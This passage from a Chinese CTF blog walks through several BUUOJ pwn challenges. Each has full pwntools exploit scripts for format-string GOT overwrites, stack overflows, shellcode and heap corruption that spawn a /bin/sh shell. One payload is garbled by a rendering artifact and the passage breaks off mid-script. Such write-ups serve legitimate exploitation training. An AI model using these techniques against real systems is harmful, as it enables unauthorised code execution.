<p>最后就是选择劫持strlen，刚开始是劫持printf的，但是可能是因为在之前有个地方已经调用了printf打印一句话导致出错，然后这边劫持的时候，要在/bin/sh前加上分号，因为我们输入的地方前面其实已经有一串字符串，所以要分隔开，才能识别出/bin/sh</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210825002000682.png"><span class="image-caption">image-20210825002000682</span></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27607</span>)<br><span class="hljs-comment">#p = process(&#x27;./axb_2019_fmt32&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>elf = ELF(<span class="hljs-string">&quot;./axb_2019_fmt32&quot;</span>)<br>printf_got = elf.got[<span class="hljs-string">&quot;printf&quot;</span>]<br>strlen_got = elf.got[<span class="hljs-string">&quot;strlen&quot;</span>]<br><span class="hljs-comment">#gdb.attach(p)</span><br><br>p.recvuntil(<span class="hljs-string">&quot;tell me:&quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span> + p32(printf_got) + <span class="hljs-string">&quot;xxxx&quot;</span> <span class="hljs-string">&quot;%8$s&quot;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&quot;xxxx&quot;</span>)<br>printf = u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;read--&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(printf))<br>sys = printf - <span class="hljs-number">0xe6e0</span><br>sys_high = (sys &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFFFF</span><br>sys_low =  (sys) &amp; <span class="hljs-number">0xFFFF</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;sys--&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(sys))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;low--&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(sys_low))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;high--&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(sys_high))<br>p.recvuntil(<span class="hljs-string">&quot;tell me:&quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span> + p32(strlen_got) + p32(strlen_got+<span class="hljs-number">2</span>) + <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(sys_low - <span class="hljs-number">18</span>) + <span class="hljs-string">&quot;c%8<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="7.679ex" height="2.676ex" style="vertical-align: -0.505ex;" viewbox="0 -934.9 3306.4 1152.1" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">hn" + '%' +str(sys_high - sys_low) +"c%9</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-68" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"/>
<path stroke-width="1" id="E1-MJMATHI-6E" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/>
<path stroke-width="1" id="E1-MJMAIN-22" d="M34 634Q34 659 50 676T93 694Q121 694 144 668T168 579Q168 525 146 476T101 403T73 379Q69 379 60 388T50 401Q50 404 62 417T88 448T116 500T131 572Q131 584 130 584T125 581T112 576T94 573Q69 573 52 590T34 634ZM238 634Q238 659 254 676T297 694Q325 694 348 668T372 579Q372 525 350 476T305 403T277 379Q273 379 264 388T254 401Q254 404 266 417T292 448T320 500T335 572Q335 584 334 584T329 581T316 576T298 573Q273 573 256 590T238 634Z"/>
<path stroke-width="1" id="E1-MJMAIN-2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"/>
<path stroke-width="1" id="E1-MJMAIN-2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-68" x="0" y="0"/>
 <use xlink:href="#E1-MJMATHI-6E" x="576" y="0"/>
 <use xlink:href="#E1-MJMAIN-22" x="1454" y="0"/>
<g transform="translate(2233,0)">
 <use xlink:href="#E1-MJMAIN-2B" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-2032" x="1100" y="583"/>
</g>
</g>
</svg>hn&quot;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&quot;tell me:&quot;</span>)<br>payload= <span class="hljs-string">&quot;;/bin/sh\x00&quot;</span><br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="五十五、bbys-tu-2016"><a href="#五十五、bbys-tu-2016" class="headerlink" title="五十五、bbys_tu_2016"></a>五十五、bbys_tu_2016</h3><p><img src="/2021/04/07/2021-04-07-buu03/image-20210826151052237.png"><span class="image-caption">image-20210826151052237</span></p>
<p>常规checksec一下，32位，开了NX</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210826151038100.png"><span class="image-caption">image-20210826151038100</span></p>
<p>进入IDA，发现有个后门函数，并且主函数十分简单，就给了个很明显的溢出，那就直接跳转到后门函数即可</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210826150923013.png"><span class="image-caption">image-20210826150923013</span></p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210826151009378.png"><span class="image-caption">image-20210826151009378</span></p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210826151024405.png"><span class="image-caption">image-20210826151024405</span></p>
<p>这边就是IDA里面的溢出不对，所以要去gdb里面动态调试计算偏移才行</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210826151210436.png"><span class="image-caption">image-20210826151210436</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27835</span>)<br><span class="hljs-comment">#p = process(&#x27;./1&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p32(<span class="hljs-number">0x804856D</span>)<br>p.sendline(payload) <br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="五十六、pwnable-start"><a href="#五十六、pwnable-start" class="headerlink" title="五十六、pwnable_start"></a>五十六、pwnable_start</h3><p><img src="/2021/04/07/2021-04-07-buu03/image-20210826151445256.png"><span class="image-caption">image-20210826151445256</span></p>
<p>常规checksec，32位，什么保护都没开</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210826151616994.png"><span class="image-caption">image-20210826151616994</span></p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210826151627593.png"><span class="image-caption">image-20210826151627593</span></p>
<p>进入IDA，只存在start，并没有main函数，只能看汇编</p>
<p>通过直接看汇编，或者进行gdb调试，都能获得输入点距离返回地址长度为0x14</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210826165108914.png"><span class="image-caption">image-20210826165108914</span></p>
<p>在gdb里面可以发现，当执行到ret，esp指向的地方存着一个栈上的地址，所以可以据此，我们先跳转到wirte函数，把esp指向的地方输出出来，从而获得栈上地址。</p>
<p>然后，因为跳转程序，同样会再次执行read，此时我们输入的栈地址比我们泄露的栈地址刚好少4个字节，因为最后都会执行到add esp,0x14，所以偏移仍然是0x14，再解释下为什么esp距离我们写入的/bin/sh\x00会差0x18，是因为执行ret时，会执行pop，所以会多4个字节</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210826173800838.png"><span class="image-caption">image-20210826173800838</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">26799</span>)<br><span class="hljs-comment">#p = process(&#x27;./start&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>p.recvuntil(<span class="hljs-string">&quot;CTF:&quot;</span>)<br>shellcode = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x14</span> + p32(<span class="hljs-number">0x08048087</span>)<br>p.send(shellcode)<br>addr = u32(p.recv(<span class="hljs-number">4</span>))<br>log.success(<span class="hljs-built_in">hex</span>(addr))<br><br>shellcode = <span class="hljs-string">&quot;/bin/sh\x00&quot;</span> + <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x14</span>-<span class="hljs-number">8</span>) +p32(addr+<span class="hljs-number">0x14</span>)<br>shellcode += asm(<span class="hljs-string">&quot;lea ebx,[esp-0x18]&quot;</span>)<br>shellcode += asm(<span class="hljs-string">&quot;mov eax,0xb&quot;</span>)<br>shellcode += asm(<span class="hljs-string">&quot;xor ecx,ecx&quot;</span>)<br>shellcode += asm(<span class="hljs-string">&quot;xor edx,edx&quot;</span>)<br>shellcode += asm(<span class="hljs-string">&quot;int 0x80&quot;</span>)<br>p.send(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="五十七、picoctf-2018-echo-back"><a href="#五十七、picoctf-2018-echo-back" class="headerlink" title="五十七、picoctf_2018_echo_back"></a>五十七、picoctf_2018_echo_back</h3><p><img src="/2021/04/07/2021-04-07-buu03/image-20210826182247503.png"><span class="image-caption">image-20210826182247503</span></p>
<p>常规checksec一下，32位，开了NX、Canary</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210826182506261.png"><span class="image-caption">image-20210826182506261</span></p>
<p>进入IDA，很明显的格式化字符串，跟这篇文章的第五题比较相似。但是少了循环，多了system函数调用，所以我们在劫持got表时需要让程序能再执行一次vuln函数，让我们能输入/bin/sh\x00，不需要泄露libc基址</p>
<p>因为后面有执行puts函数，那可以把puts的got表修改为vuln函数的起始地址</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210826191303201.png"><span class="image-caption">image-20210826191303201</span></p>
<p>偏移是7</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210826184836372.png"><span class="image-caption">image-20210826184836372</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27830</span>)<br><span class="hljs-comment">#p = process(&#x27;./1&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>printf_got = <span class="hljs-number">0x0804A010</span><br>sys_plt = <span class="hljs-number">0x08048460</span><br>puts_got = <span class="hljs-number">0x0804A01C</span><br>vuln = <span class="hljs-number">0x080485AB</span><br><br>p.recvuntil(<span class="hljs-string">&quot;message:&quot;</span>)<br>payload = p32(printf_got+<span class="hljs-number">2</span>) + p32(puts_got+<span class="hljs-number">2</span>) + p32(printf_got) + p32(puts_got) <br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x804</span>-<span class="hljs-number">0x10</span>) + <span class="hljs-string">&quot;c%7$hn&quot;</span><br>payload += <span class="hljs-string">&quot;%8$hn&quot;</span><br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x8460</span>-<span class="hljs-number">0x804</span>) + <span class="hljs-string">&quot;c%9$hn&quot;</span><br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x85AB</span>-<span class="hljs-number">0x8460</span>) + <span class="hljs-string">&quot;c%10$hn&quot;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&quot;message:&quot;</span>)<br>p.send(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>





<h3 id="五十八、ciscn-2019-sw-1"><a href="#五十八、ciscn-2019-sw-1" class="headerlink" title="五十八、ciscn_2019_sw_1"></a>五十八、ciscn_2019_sw_1</h3><p><img src="/2021/04/07/2021-04-07-buu03/image-20210826194736365.png"><span class="image-caption">image-20210826194736365</span></p>
<p>常规checksec，32位，开了NX</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210826194146179.png"><span class="image-caption">image-20210826194146179</span></p>
<p>进入IDA，这题也是一道格式化字符串，而且仔细看，跟第八题几乎一样，并且也是存在调用了system函数，不需要泄露</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210826195039322.png"><span class="image-caption">image-20210826195039322</span></p>
<p>偏移为4</p>
<p>这边因为printf后续也没别的函数，所以要让程序再执行一次就要去找在printf之后，程序还调用了什么东西，然后去把这个修改为main函数地址</p>
<p>linux中在程序结束的时候，依次调用<code>fini.array</code>中的每一个函数指针。所以这边把fini.array中的函数指针改写为main函数地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27862</span>)<br><span class="hljs-comment">#p = process(&#x27;./1&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>printf_got = <span class="hljs-number">0x0804989C</span><br>system_plt = <span class="hljs-number">0x080483D0</span><br>fini = <span class="hljs-number">0x0804979C</span><br>main = <span class="hljs-number">0x8048534</span><br><br>p.recvuntil(<span class="hljs-string">&quot;name?&quot;</span>)<br>payload = p32(printf_got+<span class="hljs-number">2</span>) + p32(fini+<span class="hljs-number">2</span>) + p32(printf_got) + p32(fini) <br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x804</span>-<span class="hljs-number">0x10</span>) + <span class="hljs-string">&quot;c%4$hn&quot;</span><br>payload += <span class="hljs-string">&quot;%5$hn&quot;</span><br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x83D0</span>-<span class="hljs-number">0x804</span>) + <span class="hljs-string">&quot;c%6$hn&quot;</span><br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x8534</span>-<span class="hljs-number">0x83D0</span>) + <span class="hljs-string">&quot;c%7$hn&quot;</span><br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">&quot;name?&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>



<h3 id="五十九、cmcc-pwnme2"><a href="#五十九、cmcc-pwnme2" class="headerlink" title="五十九、cmcc_pwnme2"></a>五十九、cmcc_pwnme2</h3><p><img src="/2021/04/07/2021-04-07-buu03/image-20210827143550209.png"><span class="image-caption">image-20210827143550209</span></p>
<p>常规checksec，32位，开启NX</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210827145058312.png"><span class="image-caption">image-20210827145058312</span></p>
<p>进入IDA，程序存在明显溢出，然后存在这个后门函数可以打印flag，也就是我们只需要让string里面放着的是flag即可跳转到这获得flag。</p>
<p>所以先溢出到返回地址，在返回地址填上输入函数gets，往string里面写入flag</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210827145907550.png"><span class="image-caption">image-20210827145907550</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">26117</span>)<br><span class="hljs-comment">#p = process(&#x27;./1&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwnme2&#x27;</span>)<br>string = <span class="hljs-number">0x0804A060</span><br>gets = elf.plt[<span class="hljs-string">&#x27;gets&#x27;</span>]<br><br><br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span> + p32(gets) + p32(<span class="hljs-number">0x080485CB</span>) + p32(string)<br>p.recvuntil(<span class="hljs-string">&quot;input:&quot;</span>)<br>p.sendline(payload)<br>p.sendline(<span class="hljs-string">&quot;./flag&quot;</span>)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>



<h3 id="六十、hitcontraining-magicheap"><a href="#六十、hitcontraining-magicheap" class="headerlink" title="六十、hitcontraining_magicheap"></a>六十、hitcontraining_magicheap</h3><p><img src="/2021/04/07/2021-04-07-buu03/image-20210827153019146.png"><span class="image-caption">image-20210827153019146</span></p>
<p>常规checksec，64位，根据题目是道堆题，开了NX、Canary</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210827153850520.png"><span class="image-caption">image-20210827153850520</span></p>
<p>进入IDA，发现给了个后门函数，好东西</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210827155315034.png"><span class="image-caption">image-20210827155315034</span></p>
<p>这边如果magic &gt;4869就可以执行到后门函数</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210827155753245.png"><span class="image-caption">image-20210827155753245</span></p>
<p>漏洞点可以说是十分明显了，这边edit函数里面输入的长度都没有检查的</p>
<p>思路：通过堆溢出，覆盖后面堆块，把堆块申请到magic前面，把magic的值修改成大于4869</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210827161445791.png"><span class="image-caption">image-20210827161445791</span></p>
<p>成功getshell</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./magicheap&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29052</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Size of Heap :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;Content of heap:&quot;</span>)<br>	p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;Size of Heap : &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>	p.recvuntil(<span class="hljs-string">&quot;Content of heap : &quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>shell = <span class="hljs-number">0x0000000000400C50</span><br>magic = <span class="hljs-number">0x00000000006020A0</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;cccc&#x27;</span>) <span class="hljs-comment">#2</span><br>free(<span class="hljs-number">1</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span> + p64(<span class="hljs-number">0x70</span>) + p64(magic-<span class="hljs-number">0x20</span>+<span class="hljs-number">0xd</span>)<br>edit(<span class="hljs-number">0</span>,payload)<br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">0x60</span>,p64(<span class="hljs-number">4870</span>))<br>add(<span class="hljs-number">0x60</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">4870</span>))<br><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;4869&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h3 id="六十一、hitcontraining-heapcreator"><a href="#六十一、hitcontraining-heapcreator" class="headerlink" title="六十一、hitcontraining_heapcreator"></a>六十一、hitcontraining_heapcreator</h3><p><img src="/2021/04/07/2021-04-07-buu03/image-20210829092850758.png"><span class="image-caption">image-20210829092850758</span></p>
<p>常规checksec，开了NX、Cannary</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210829094339915.png"><span class="image-caption">image-20210829094339915</span></p>
<p>进入IDA，阅读完代码后，在edit函数中，存在明显的溢出一个字节的漏洞（offbyone）</p>
<p>因为有offbyone漏洞在，那肯定是朝着去修改堆头的大小去的，最终达成overlap</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210829104050093.png"><span class="image-caption">image-20210829104050093</span></p>
<p>先申请出这些堆块，其中第一个是要申请0x18的，因为这样才能覆盖到下一个堆块的size位。然后因为RELRO和PIE的缘故，我选择劫持got表的方法，所以第四个堆块内容就是写着/bin/sh\x00的。当然，也可以把/bin/sh\x00写到第0个堆块上</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210829104713815.png"><span class="image-caption">image-20210829104713815</span></p>
<p>此时只要再把这个释放了，然后再申请同样大小的堆块回来，那么我们就可以操控其中本来是第二堆块的内容</p>
<p>然后把可以操控的堆结构内容修改为free的got表地址，从而可以利用show函数打印出libc地址。最后再写入sys即可getshell</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210829110519523.png"><span class="image-caption">image-20210829110519523</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./heapcreator&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">26372</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Size of Heap : &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;Content of heap:&quot;</span>)<br>	p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;Content of heap : &quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>free_got = elf.got[<span class="hljs-string">&quot;free&quot;</span>]<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;a&#x27;</span>) <br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;b&#x27;</span>) <br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;c&#x27;</span>) <br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>) <br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">&#x27;\x81&#x27;</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span 